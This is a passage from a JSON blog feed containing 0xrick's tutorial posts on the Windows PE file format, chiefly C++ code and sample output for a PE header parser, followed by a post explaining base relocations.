4]; PEFILE_RICH_HEADER.entries[(i / 8) - 2] = { PRODID, BUILDID, USECOUNT }; if (i + 8 &gt;= RichHeaderSize) { PEFILE_RICH_HEADER.entries[(i / 8) - 1] = { 0x0000, 0x0000, 0x00000000 }; } } delete[] PEFILE_RICH_HEADER_INFO.ptrToBuffer; } PrintRichHeaderInfo() This function iterates over each entry in PEFILE_RICH_HEADER and prints its value. void PE64FILE::PrintRichHeaderInfo() { printf(\" RICH HEADER:\\n\"); printf(\" ------------\\n\\n\"); for (int i = 0; i &lt; PEFILE_RICH_HEADER_INFO.entries; i++) { printf(\" 0x%X 0x%X 0x%X: %d.%d.%d\\n\", PEFILE_RICH_HEADER.entries[i].buildID, PEFILE_RICH_HEADER.entries[i].prodID, PEFILE_RICH_HEADER.entries[i].useCount, PEFILE_RICH_HEADER.entries[i].buildID, PEFILE_RICH_HEADER.entries[i].prodID, PEFILE_RICH_HEADER.entries[i].useCount); } } Parsing NT Headers ParseNTHeaders() Similar to the DOS Header, all we need to do is to read from e_lfanew an amount of bytes equal to the size of IMAGE_NT_HEADERS. After that we can parse out the contents of the File Header and the Optional Header. The Optional Header contains an array of IMAGE_DATA_DIRECTORY structures which we care about. To parse out this information, we can use the IMAGE_DIRECTORY_[...] constants defined in winnt.h as array indexes to access the corresponding IMAGE_DATA_DIRECTORY structure of each Data Directory. void PE64FILE::ParseNTHeaders() { fseek(Ppefile, PEFILE_DOS_HEADER.e_lfanew, SEEK_SET); fread(&amp;PEFILE_NT_HEADERS, sizeof(PEFILE_NT_HEADERS), 1, Ppefile); PEFILE_NT_HEADERS_SIGNATURE = PEFILE_NT_HEADERS.Signature; PEFILE_NT_HEADERS_FILE_HEADER_MACHINE = PEFILE_NT_HEADERS.FileHeader.Machine; PEFILE_NT_HEADERS_FILE_HEADER_NUMBER0F_SECTIONS = PEFILE_NT_HEADERS.FileHeader.NumberOfSections; PEFILE_NT_HEADERS_FILE_HEADER_SIZEOF_OPTIONAL_HEADER = PEFILE_NT_HEADERS.FileHeader.SizeOfOptionalHeader; PEFILE_NT_HEADERS_OPTIONAL_HEADER_MAGIC = PEFILE_NT_HEADERS.OptionalHeader.Magic; PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_CODE = PEFILE_NT_HEADERS.OptionalHeader.SizeOfCode; PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_INITIALIZED_DATA = PEFILE_NT_HEADERS.OptionalHeader.SizeOfInitializedData; PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_UNINITIALIZED_DATA = PEFILE_NT_HEADERS.OptionalHeader.SizeOfUninitializedData; PEFILE_NT_HEADERS_OPTIONAL_HEADER_ADDRESSOF_ENTRYPOINT = PEFILE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint; PEFILE_NT_HEADERS_OPTIONAL_HEADER_BASEOF_CODE = PEFILE_NT_HEADERS.OptionalHeader.BaseOfCode; PEFILE_NT_HEADERS_OPTIONAL_HEADER_IMAGEBASE = PEFILE_NT_HEADERS.OptionalHeader.ImageBase; PEFILE_NT_HEADERS_OPTIONAL_HEADER_SECTION_ALIGNMENT = PEFILE_NT_HEADERS.OptionalHeader.SectionAlignment; PEFILE_NT_HEADERS_OPTIONAL_HEADER_FILE_ALIGNMENT = PEFILE_NT_HEADERS.OptionalHeader.FileAlignment; PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_IMAGE = PEFILE_NT_HEADERS.OptionalHeader.SizeOfImage; PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_HEADERS = PEFILE_NT_HEADERS.OptionalHeader.SizeOfHeaders; PEFILE_EXPORT_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_EXPORT]; PEFILE_IMPORT_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_IMPORT]; PEFILE_RESOURCE_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_RESOURCE]; PEFILE_EXCEPTION_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_EXCEPTION]; PEFILE_SECURITY_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_SECURITY]; PEFILE_BASERELOC_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_BASERELOC]; PEFILE_DEBUG_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_DEBUG]; PEFILE_ARCHITECTURE_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_ARCHITECTURE]; PEFILE_GLOBALPTR_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_GLOBALPTR]; PEFILE_TLS_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_TLS]; PEFILE_LOAD_CONFIG_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG]; PEFILE_BOUND_IMPORT_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT]; PEFILE_IAT_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_IAT]; PEFILE_DELAY_IMPORT_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT]; PEFILE_COM_DESCRIPTOR_DIRECTORY = PEFILE_NT_HEADERS.OptionalHeader.DataDirectory[___IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR]; } PrintNTHeadersInfo() This function prints the data obtained from the File Header and the Optional Header, and for each Data Directory it prints its RVA and size. void PE64FILE::PrintNTHeadersInfo() { printf(\" NT HEADERS:\\n\"); printf(\" -----------\\n\\n\"); printf(\" PE Signature: 0x%X\\n\", PEFILE_NT_HEADERS_SIGNATURE); printf(\"\\n File Header:\\n\\n\"); printf(\" Machine: 0x%X\\n\", PEFILE_NT_HEADERS_FILE_HEADER_MACHINE); printf(\" Number of sections: 0x%X\\n\", PEFILE_NT_HEADERS_FILE_HEADER_NUMBER0F_SECTIONS); printf(\" Size of optional header: 0x%X\\n\", PEFILE_NT_HEADERS_FILE_HEADER_SIZEOF_OPTIONAL_HEADER); printf(\"\\n Optional Header:\\n\\n\"); printf(\" Magic: 0x%X\\n\", PEFILE_NT_HEADERS_OPTIONAL_HEADER_MAGIC); printf(\" Size of code section: 0x%X\\n\", PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_CODE); printf(\" Size of initialized data: 0x%X\\n\", PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_INITIALIZED_DATA); printf(\" Size of uninitialized data: 0x%X\\n\", PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_UNINITIALIZED_DATA); printf(\" Address of entry point: 0x%X\\n\", PEFILE_NT_HEADERS_OPTIONAL_HEADER_ADDRESSOF_ENTRYPOINT); printf(\" RVA of start of code section: 0x%X\\n\", PEFILE_NT_HEADERS_OPTIONAL_HEADER_BASEOF_CODE); printf(\" Desired image base: 0x%X\\n\", PEFILE_NT_HEADERS_OPTIONAL_HEADER_IMAGEBASE); printf(\" Section alignment: 0x%X\\n\", PEFILE_NT_HEADERS_OPTIONAL_HEADER_SECTION_ALIGNMENT); printf(\" File alignment: 0x%X\\n\", PEFILE_NT_HEADERS_OPTIONAL_HEADER_FILE_ALIGNMENT); printf(\" Size of image: 0x%X\\n\", PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_IMAGE); printf(\" Size of headers: 0x%X\\n\", PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_HEADERS); printf(\"\\n Data Directories:\\n\"); printf(\"\\n * Export Directory:\\n\"); printf(\" RVA: 0x%X\\n\", PEFILE_EXPORT_DIRECTORY.VirtualAddress); printf(\" Size: 0x%X\\n\", PEFILE_EXPORT_DIRECTORY.Size); . . [REDACTED] . . printf(\"\\n * COM Runtime Descriptor:\\n\"); printf(\" RVA: 0x%X\\n\", PEFILE_COM_DESCRIPTOR_DIRECTORY.VirtualAddress); printf(\" Size: 0x%X\\n\", PEFILE_COM_DESCRIPTOR_DIRECTORY.Size); } Parsing Section Headers ParseSectionHeaders() This function starts by assigning the PEFILE_SECTION_HEADERS class member to a pointer to an IMAGE_SECTION_HEADER array of the count of PEFILE_NT_HEADERS_FILE_HEADER_NUMBEROF_SECTIONS. Then it goes into a loop of PEFILE_NT_HEADERS_FILE_HEADER_NUMBEROF_SECTIONS iterations where in each iteration it changes the file offset to (e_lfanew + size of NT Headers + loop counter multiplied by the size of a section header) to reach the beginning of the next Section Header, then it reads the new Section Header and assigns it to the next element of PEFILE_SECTION_HEADERS. void PE64FILE::ParseSectionHeaders() { PEFILE_SECTION_HEADERS = new ___IMAGE_SECTION_HEADER[PEFILE_NT_HEADERS_FILE_HEADER_NUMBER0F_SECTIONS]; for (int i = 0; i &lt; PEFILE_NT_HEADERS_FILE_HEADER_NUMBER0F_SECTIONS; i++) { int offset = (PEFILE_DOS_HEADER.e_lfanew + sizeof(PEFILE_NT_HEADERS)) + (i * ___IMAGE_SIZEOF_SECTION_HEADER); fseek(Ppefile, offset, SEEK_SET); fread(&amp;PEFILE_SECTION_HEADERS[i], ___IMAGE_SIZEOF_SECTION_HEADER, 1, Ppefile); } } PrintSectionHeadersInfo() This function loops over the Section Headers array (filled by ParseSectionHeaders()), and it prints information about each section. void PE64FILE::PrintSectionHeadersInfo() { printf(\" SECTION HEADERS:\\n\"); printf(\" ----------------\\n\\n\"); for (int i = 0; i &lt; PEFILE_NT_HEADERS_FILE_HEADER_NUMBER0F_SECTIONS; i++) { printf(\" * %.8s:\\n\", PEFILE_SECTION_HEADERS[i].Name); printf(\" VirtualAddress: 0x%X\\n\", PEFILE_SECTION_HEADERS[i].VirtualAddress); printf(\" VirtualSize: 0x%X\\n\", PEFILE_SECTION_HEADERS[i].Misc.VirtualSize); printf(\" PointerToRawData: 0x%X\\n\", PEFILE_SECTION_HEADERS[i].PointerToRawData); printf(\" SizeOfRawData: 0x%X\\n\", PEFILE_SECTION_HEADERS[i].SizeOfRawData); printf(\" Characteristics: 0x%X\\n\\n\", PEFILE_SECTION_HEADERS[i].Characteristics); } } Parsing Imports ParseImportDirectory() To parse out the Import Directory Table we need to determine the count of IMAGE_IMPORT_DESCRIPTORs first. This function starts by resolving the file offset of the Import Directory, then it goes into a loop where in each loop it keeps reading the next import descriptor. In each iteration it checks if the descriptor has zeroed out values, if that is the case then we’ve reached the end of the Import Directory, so it breaks. Otherwise it increments _import_directory_count and the loop continues. After finding the size of the Import Directory, the function assigns the PEFILE_IMPORT_TABLE class member to a pointer to an IMAGE_IMPORT_DESCRIPTOR array of the count of _import_directory_count then goes into another loop similar to the one we’ve seen in ParseSectionHeaders() to parse out the import descriptors. void PE64FILE::ParseImportDirectory() { DWORD _import_directory_address = resolve(PEFILE_IMPORT_DIRECTORY.VirtualAddress, locate(PEFILE_IMPORT_DIRECTORY.VirtualAddress)); _import_directory_count = 0; while (true) { ___IMAGE_IMPORT_DESCRIPTOR tmp; int offset = (_import_directory_count * sizeof(___IMAGE_IMPORT_DESCRIPTOR)) + _import_directory_address; fseek(Ppefile, offset, SEEK_SET); fread(&amp;tmp, sizeof(___IMAGE_IMPORT_DESCRIPTOR), 1, Ppefile); if (tmp.Name == 0x00000000 &amp;&amp; tmp.FirstThunk == 0x00000000) { _import_directory_count -= 1; _import_directory_size = _import_directory_count * sizeof(___IMAGE_IMPORT_DESCRIPTOR); break; } _import_directory_count++; } PEFILE_IMPORT_TABLE = new ___IMAGE_IMPORT_DESCRIPTOR[_import_directory_count]; for (int i = 0; i &lt; _import_directory_count; i++) { int offset = (i * sizeof(___IMAGE_IMPORT_DESCRIPTOR)) + _import_directory_address; fseek(Ppefile, offset, SEEK_SET); fread(&amp;PEFILE_IMPORT_TABLE[i], sizeof(___IMAGE_IMPORT_DESCRIPTOR), 1, Ppefile); } } PrintImportTableInfo() After obtaining the import descriptors, further parsing is needed to retrieve information about the imported functions. This is done by the PrintImportTableInfo() function. This function iterates over the import descriptors, and for each descriptor it resolves the file offset of the DLL name, retrieves the DLL name then prints it, it also prints the ILT RVA, the IAT RVA and whether the import is bound or not. After that it resolves the file offset of the ILT then it parses out each ILT entry. If the Ordinal/Name flag is set it prints the function ordinal, otherwise it prints the function name, the hint RVA and the hint. If the ILT entry is zeroed out, the loop breaks and the next import descriptor parsing iteration starts. We’ve discussed the details about this in the PE imports post. void PE64FILE::PrintImportTableInfo() { printf(\" IMPORT TABLE:\\n\"); printf(\" ----------------\\n\\n\"); for (int i = 0; i &lt; _import_directory_count; i++) { DWORD NameAddr = resolve(PEFILE_IMPORT_TABLE[i].Name, locate(PEFILE_IMPORT_TABLE[i].Name)); int NameSize = 0; while (true) { char tmp; fseek(Ppefile, (NameAddr + NameSize), SEEK_SET); fread(&amp;tmp, sizeof(char), 1, Ppefile); if (tmp == 0x00) { break; } NameSize++; } char* Name = new char[NameSize + 2]; fseek(Ppefile, NameAddr, SEEK_SET); fread(Name, (NameSize * sizeof(char)) + 1, 1, Ppefile); printf(\" * %s:\\n\", Name); delete[] Name; printf(\" ILT RVA: 0x%X\\n\", PEFILE_IMPORT_TABLE[i].DUMMYUNIONNAME.OriginalFirstThunk); printf(\" IAT RVA: 0x%X\\n\", PEFILE_IMPORT_TABLE[i].FirstThunk); if (PEFILE_IMPORT_TABLE[i].TimeDateStamp == 0) { printf(\" Bound: FALSE\\n\"); } else if (PEFILE_IMPORT_TABLE[i].TimeDateStamp == -1) { printf(\" Bound: TRUE\\n\"); } printf(\"\\n\"); DWORD ILTAddr = resolve(PEFILE_IMPORT_TABLE[i].DUMMYUNIONNAME.OriginalFirstThunk, locate(PEFILE_IMPORT_TABLE[i].DUMMYUNIONNAME.OriginalFirstThunk)); int entrycounter = 0; while (true) { ILT_ENTRY_64 entry; fseek(Ppefile, (ILTAddr + (entrycounter * sizeof(QWORD))), SEEK_SET); fread(&amp;entry, sizeof(ILT_ENTRY_64), 1, Ppefile); BYTE flag = entry.ORDINAL_NAME_FLAG; DWORD HintRVA = 0x0; WORD ordinal = 0x0; if (flag == 0x0) { HintRVA = entry.FIELD_2.HINT_NAME_TABE; } else if (flag == 0x01) { ordinal = entry.FIELD_2.ORDINAL; } if (flag == 0x0 &amp;&amp; HintRVA == 0x0 &amp;&amp; ordinal == 0x0) { break; } printf(\"\\n Entry:\\n\"); if (flag == 0x0) { ___IMAGE_IMPORT_BY_NAME hint; DWORD HintAddr = resolve(HintRVA, locate(HintRVA)); fseek(Ppefile, HintAddr, SEEK_SET); fread(&amp;hint, sizeof(___IMAGE_IMPORT_BY_NAME), 1, Ppefile); printf(\" Name: %s\\n\", hint.Name); printf(\" Hint RVA: 0x%X\\n\", HintRVA); printf(\" Hint: 0x%X\\n\", hint.Hint); } else if (flag == 1) { printf(\" Ordinal: 0x%X\\n\", ordinal); } entrycounter++; } printf(\"\\n ----------------------\\n\\n\"); } } Parsing Base Relocations ParseBaseReloc() This function follows the same process we’ve seen in ParseImportDirectory(). It resolves the file offset of the Base Relocation Directory, then it loops over each relocation block until it reaches a zeroed out block. Then it parses out these blocks and saves each IMAGE_BASE_RELOCATION structure in PEFILE_BASERELOC_TABLE. One thing to note here that is different from what we’ve seen in ParseImportDirectory() is that in addition to keeping a block counter we also keep a size counter that’s incremented by adding the value of SizeOfBlock of each block in each iteration. We do this because relocation blocks don’t have a fixed size, and in order to correctly calculate the offset of the next relocation block we need the total size of the previous blocks. void PE64FILE::ParseBaseReloc() { DWORD _basereloc_directory_address = resolve(PEFILE_BASERELOC_DIRECTORY.VirtualAddress, locate(PEFILE_BASERELOC_DIRECTORY.VirtualAddress)); _basreloc_directory_count = 0; int _basereloc_size_counter = 0; while (true) { ___IMAGE_BASE_RELOCATION tmp; int offset = (_basereloc_size_counter + _basereloc_directory_address); fseek(Ppefile, offset, SEEK_SET); fread(&amp;tmp, sizeof(___IMAGE_BASE_RELOCATION), 1, Ppefile); if (tmp.VirtualAddress == 0x00000000 &amp;&amp; tmp.SizeOfBlock == 0x00000000) { break; } _basreloc_directory_count++; _basereloc_size_counter += tmp.SizeOfBlock; } PEFILE_BASERELOC_TABLE = new ___IMAGE_BASE_RELOCATION[_basreloc_directory_count]; _basereloc_size_counter = 0; for (int i = 0; i &lt; _basreloc_directory_count; i++) { int offset = _basereloc_directory_address + _basereloc_size_counter; fseek(Ppefile, offset, SEEK_SET); fread(&amp;PEFILE_BASERELOC_TABLE[i], sizeof(___IMAGE_BASE_RELOCATION), 1, Ppefile); _basereloc_size_counter += PEFILE_BASERELOC_TABLE[i].SizeOfBlock; } } PrintBaseRelocationInfo() This function iterates over the base relocation blocks, and for each block it resolves the file offset of the block, then it prints the block RVA, size and number of entries (calculated by subtracting the size of IMAGE_BASE_RELOCATION from the block size then dividing that by the size of a WORD). After that it iterates over the relocation entries and prints the relocation value, and from that value it separates the type and the offset and prints each one of them. We’ve discussed the details about this in the PE base relocations post. void PE64FILE::PrintBaseRelocationsInfo() { printf(\" BASE RELOCATIONS TABLE:\\n\"); printf(\" -----------------------\\n\"); int szCounter = sizeof(___IMAGE_BASE_RELOCATION); for (int i = 0; i &lt; _basreloc_directory_count; i++) { DWORD PAGERVA, BLOCKSIZE, BASE_RELOC_ADDR; int ENTRIES; BASE_RELOC_ADDR = resolve(PEFILE_BASERELOC_DIRECTORY.VirtualAddress, locate(PEFILE_BASERELOC_DIRECTORY.VirtualAddress)); PAGERVA = PEFILE_BASERELOC_TABLE[i].VirtualAddress; BLOCKSIZE = PEFILE_BASERELOC_TABLE[i].SizeOfBlock; ENTRIES = (BLOCKSIZE - sizeof(___IMAGE_BASE_RELOCATION)) / sizeof(WORD); printf(\"\\n Block 0x%X: \\n\", i); printf(\" Page RVA: 0x%X\\n\", PAGERVA); printf(\" Block size: 0x%X\\n\", BLOCKSIZE); printf(\" Number of entries: 0x%X\\n\", ENTRIES); printf(\"\\n Entries:\\n\"); for (int i = 0; i &lt; ENTRIES; i++) { BASE_RELOC_ENTRY entry; int offset = (BASE_RELOC_ADDR + szCounter + (i * sizeof(WORD))); fseek(Ppefile, offset, SEEK_SET); fread(&amp;entry, sizeof(WORD), 1, Ppefile); printf(\"\\n * Value: 0x%X\\n\", entry); printf(\" Relocation Type: 0x%X\\n\", entry.TYPE); printf(\" Offset: 0x%X\\n\", entry.OFFSET); } printf(\"\\n ----------------------\\n\\n\"); szCounter += BLOCKSIZE; } } Conclusion Here’s the full output after running the parser on a file: Desktop&gt;.\\PE-Parser.exe .\\SimpleApp64.exe FILE: .\\SimpleApp64.exe TYPE: 0x20B (PE32+) ---------------------------------- DOS HEADER: ----------- Magic: 0x5A4D File address of new exe header: 0x100 ---------------------------------- RICH HEADER: ------------ 0x7809 0x93 0xA: 30729.147.10 0x6FCB 0x101 0x2: 28619.257.2 0x6FCB 0x105 0x11: 28619.261.17 0x6FCB 0x104 0xA: 28619.260.10 0x6FCB 0x103 0x3: 28619.259.3 0x685B 0x101 0x5: 26715.257.5 0x0 0x1 0x30: 0.1.48 0x7086 0x109 0x1: 28806.265.1 0x7086 0xFF 0x1: 28806.255.1 0x7086 0x102 0x1: 28806.258.1 ---------------------------------- NT HEADERS: ----------- PE Signature: 0x4550 File Header: Machine: 0x8664 Number of sections: 0x6 Size of optional header: 0xF0 Optional Header: Magic: 0x20B Size of code section: 0xE00 Size of initialized data: 0x1E00 Size of uninitialized data: 0x0 Address of entry point: 0x12C4 RVA of start of code section: 0x1000 Desired image base: 0x40000000 Section alignment: 0x1000 File alignment: 0x200 Size of image: 0x7000 Size of headers: 0x400 Data Directories: * Export Directory: RVA: 0x0 Size: 0x0 * Import Directory: RVA: 0x27AC Size: 0xB4 * Resource Directory: RVA: 0x5000 Size: 0x1E0 * Exception Directory: RVA: 0x4000 Size: 0x168 * Security Directory: RVA: 0x0 Size: 0x0 * Base Relocation Table: RVA: 0x6000 Size: 0x28 * Debug Directory: RVA: 0x2248 Size: 0x70 * Architecture Specific Data: RVA: 0x0 Size: 0x0 * RVA of GlobalPtr: RVA: 0x0 Size: 0x0 * TLS Directory: RVA: 0x0 Size: 0x0 * Load Configuration Directory: RVA: 0x22C0 Size: 0x130 * Bound Import Directory: RVA: 0x0 Size: 0x0 * Import Address Table: RVA: 0x2000 Size: 0x198 * Delay Load Import Descriptors: RVA: 0x0 Size: 0x0 * COM Runtime Descriptor: RVA: 0x0 Size: 0x0 ---------------------------------- SECTION HEADERS: ---------------- * .text: VirtualAddress: 0x1000 VirtualSize: 0xD2C PointerToRawData: 0x400 SizeOfRawData: 0xE00 Characteristics: 0x60000020 * .rdata: VirtualAddress: 0x2000 VirtualSize: 0xE3C PointerToRawData: 0x1200 SizeOfRawData: 0x1000 Characteristics: 0x40000040 * .data: VirtualAddress: 0x3000 VirtualSize: 0x638 PointerToRawData: 0x2200 SizeOfRawData: 0x200 Characteristics: 0xC0000040 * .pdata: VirtualAddress: 0x4000 VirtualSize: 0x168 PointerToRawData: 0x2400 SizeOfRawData: 0x200 Characteristics: 0x40000040 * .rsrc: VirtualAddress: 0x5000 VirtualSize: 0x1E0 PointerToRawData: 0x2600 SizeOfRawData: 0x200 Characteristics: 0x40000040 * .reloc: VirtualAddress: 0x6000 VirtualSize: 0x28 PointerToRawData: 0x2800 SizeOfRawData: 0x200 Characteristics: 0x42000040 ---------------------------------- IMPORT TABLE: ---------------- * USER32.dll: ILT RVA: 0x28E0 IAT RVA: 0x2080 Bound: FALSE Entry: Name: MessageBoxA Hint RVA: 0x29F8 Hint: 0x283 ---------------------- * VCRUNTIME140.dll: ILT RVA: 0x28F0 IAT RVA: 0x2090 Bound: FALSE Entry: Name: memset Hint RVA: 0x2A5E Hint: 0x3E Entry: Name: __current_exception_context Hint RVA: 0x2A40 Hint: 0x1C Entry: Name: __current_exception Hint RVA: 0x2A2A Hint: 0x1B Entry: Name: __C_specific_handler Hint RVA: 0x2A12 Hint: 0x8 ---------------------- * api-ms-win-crt-runtime-l1-1-0.dll: ILT RVA: 0x2948 IAT RVA: 0x20E8 Bound: FALSE Entry: Name: _crt_atexit Hint RVA: 0x2C12 Hint: 0x1E Entry: Name: terminate Hint RVA: 0x2C20 Hint: 0x67 Entry: Name: _exit Hint RVA: 0x2B30 Hint: 0x23 Entry: Name: _register_thread_local_exe_atexit_callback Hint RVA: 0x2B76 Hint: 0x3D Entry: Name: _c_exit Hint RVA: 0x2B6C Hint: 0x15 Entry: Name: exit Hint RVA: 0x2B28 Hint: 0x55 Entry: Name: _initterm_e Hint RVA: 0x2B1A Hint: 0x37 Entry: Name: _initterm Hint RVA: 0x2B0E Hint: 0x36 Entry: Name: _get_initial_narrow_environment Hint RVA: 0x2AEC Hint: 0x28 Entry: Name: _initialize_narrow_environment Hint RVA: 0x2ACA Hint: 0x33 Entry: Name: _configure_narrow_argv Hint RVA: 0x2AB0 Hint: 0x18 Entry: Name: _initialize_onexit_table Hint RVA: 0x2BDA Hint: 0x34 Entry: Name: _set_app_type Hint RVA: 0x2A8C Hint: 0x42 Entry: Name: _seh_filter_exe Hint RVA: 0x2A7A Hint: 0x40 Entry: Name: _cexit Hint RVA: 0x2B62 Hint: 0x16 Entry: Name: __p___argv Hint RVA: 0x2B54 Hint: 0x5 Entry: Name: __p___argc Hint RVA: 0x2B46 Hint: 0x4 Entry: Name: _register_onexit_function Hint RVA: 0x2BF6 Hint: 0x3C ---------------------- * api-ms-win-crt-math-l1-1-0.dll: ILT RVA: 0x2938 IAT RVA: 0x20D8 Bound: FALSE Entry: Name: __setusermatherr Hint RVA: 0x2A9C Hint: 0x9 ---------------------- * api-ms-win-crt-stdio-l1-1-0.dll: ILT RVA: 0x29E0 IAT RVA: 0x2180 Bound: FALSE Entry: Name: __p__commode Hint RVA: 0x2BCA Hint: 0x1 Entry: Name: _set_fmode Hint RVA: 0x2B38 Hint: 0x54 ---------------------- * api-ms-win-crt-locale-l1-1-0.dll: ILT RVA: 0x2928 IAT RVA: 0x20C8 Bound: FALSE Entry: Name: _configthreadlocale Hint RVA: 0x2BA4 Hint: 0x8 ---------------------- * api-ms-win-crt-heap-l1-1-0.dll: ILT RVA: 0x2918 IAT RVA: 0x20B8 Bound: FALSE Entry: Name: _set_new_mode Hint RVA: 0x2BBA Hint: 0x16 ---------------------- ---------------------------------- BASE RELOCATIONS TABLE: ----------------------- Block 0x0: Page RVA: 0x2000 Block size: 0x28 Number of entries: 0x10 Entries: * Value: 0xA198 Relocation Type: 0xA Offset: 0x198 * Value: 0xA1A0 Relocation Type: 0xA Offset: 0x1A0 * Value: 0xA1A8 Relocation Type: 0xA Offset: 0x1A8 * Value: 0xA1B0 Relocation Type: 0xA Offset: 0x1B0 * Value: 0xA1B8 Relocation Type: 0xA Offset: 0x1B8 * Value: 0xA1C8 Relocation Type: 0xA Offset: 0x1C8 * Value: 0xA1E0 Relocation Type: 0xA Offset: 0x1E0 * Value: 0xA1E8 Relocation Type: 0xA Offset: 0x1E8 * Value: 0xA220 Relocation Type: 0xA Offset: 0x220 * Value: 0xA228 Relocation Type: 0xA Offset: 0x228 * Value: 0xA318 Relocation Type: 0xA Offset: 0x318 * Value: 0xA330 Relocation Type: 0xA Offset: 0x330 * Value: 0xA338 Relocation Type: 0xA Offset: 0x338 * Value: 0xA3D8 Relocation Type: 0xA Offset: 0x3D8 * Value: 0xA3E0 Relocation Type: 0xA Offset: 0x3E0 * Value: 0xA3E8 Relocation Type: 0xA Offset: 0x3E8 ---------------------- ---------------------------------- I hope that seeing actual code has given you a better understanding of what we’ve discussed throughout the previous posts. I believe that there are better ways for implementation than the ones I have presented, I’m in no way a c++ programmer and I know that there’s always room for improvement, so feel free to reach out to me, any feedback would be much appreciated. Thanks for reading.",
          "link": "https://0xrick.github.io/win-internals/pe8/",
          "publishedOn": "2021-10-29T01:00:00.000Z",
          "wordCount": 6006,
          "title": "A dive into the PE file format - LAB 1: Writing a PE Parser",
          "imageUrl": null
        },
        {
          "id": "https://0xrick.github.io/win-internals/pe7/",
          "author": null,
          "description": "A dive into the PE file format - PE file structure - Part 6: PE Base Relocations Introduction In this post we’re going to talk about PE base relocations. We’re going to discuss what relocations are, then we’ll take a look at the relocation table. Relocations When a program is compiled, the compiler assumes that the executable is going to be loaded at a certain base address, that address is saved in IMAGE_OPTIONAL_HEADER.ImageBase, some addresses get calculated then hardcoded within the executable based on the base address. However for a variety of reasons, it’s not very likely that the executable is going to get its desired base address, it will get loaded in another base address and that will make all of the hardcoded addresses invalid. A list of all hardcoded values that will need fixing if the image is loaded at a different base address is saved in a special table called the Relocation Table (a Data Directory within the .reloc section). The process of relocating (done by the loader) is what fixes these values. Let’s take an example, the following code defines an int variable and a pointer to that variable: int test = 2; int* testPtr = &amp;test; During compile-time, the compiler will assume a base address, let’s say it assumes a base address of 0x1000, it decides that test will be located at an offset of 0x100 and based on that it gives testPtr a value of 0x1100. Later on, a user runs the program and the image gets loaded into memory. It gets a base address of 0x2000, this means that the hardcoded value of testPtr will be invalid, the loader fixes that value by adding the difference between the assumed base address and the actual base address, in this case it’s a difference of 0x1000 (0x2000 - 0x1000), so the new value of testPtr will be 0x2100 (0x1100 + 0x1000) which is the correct new address of test. Relocation Table As described by Microsoft documentation, the base relocation table contains entries for all base relocations in the image. It’s a Data Directory located within the .reloc section, it’s divided into blocks, each block represents the base relocations for a 4K page and each block must start on a 32-bit boundary. Each block starts with an IMAGE_BASE_RELOCATION structure followed by any number of offset field entries. The IMAGE_BASE_RELOCATION structure specifies the page RVA, and the size of the relocation block. typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; DWORD SizeOfBlock; } IMAGE_BASE_RELOCATION; typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; Each offset field entry is a WORD, first 4 bits of it define the relocation type (check Microsoft documentation for a list of relocation types), the last 12 bits store an offset from the RVA specified in the IMAGE_BASE_RELOCATION structure at the start of the relocation block. Each relocation entry gets processed by adding the RVA of the page to the image base address, then by adding the offset specified in the relocation entry, an absolute address of the location that needs fixing can be obtained. The PE file I’m looking at contains only one relocation block, its size is 0x28 bytes: We know that each block starts with an 8-byte-long structure, meaning that the size of the entries is 0x20 bytes (32 bytes), each entry’s size is 2 bytes so the total number of entries should be 16. Conclusion That’s all. Thanks for reading.",
          "link": "https://0xrick.github.io/win-internals/pe7/",
          "publishedOn": "2021-10-28T15:00:00.000Z",
          "wordCount": 763,
          "title": "A dive into the PE file format - PE file structure - Part 6: PE Base Relocations",
          "imageUrl": null
        },
        {
          "id": "https://0xrick.github.io/win-internals/pe6/",
          "author": null,
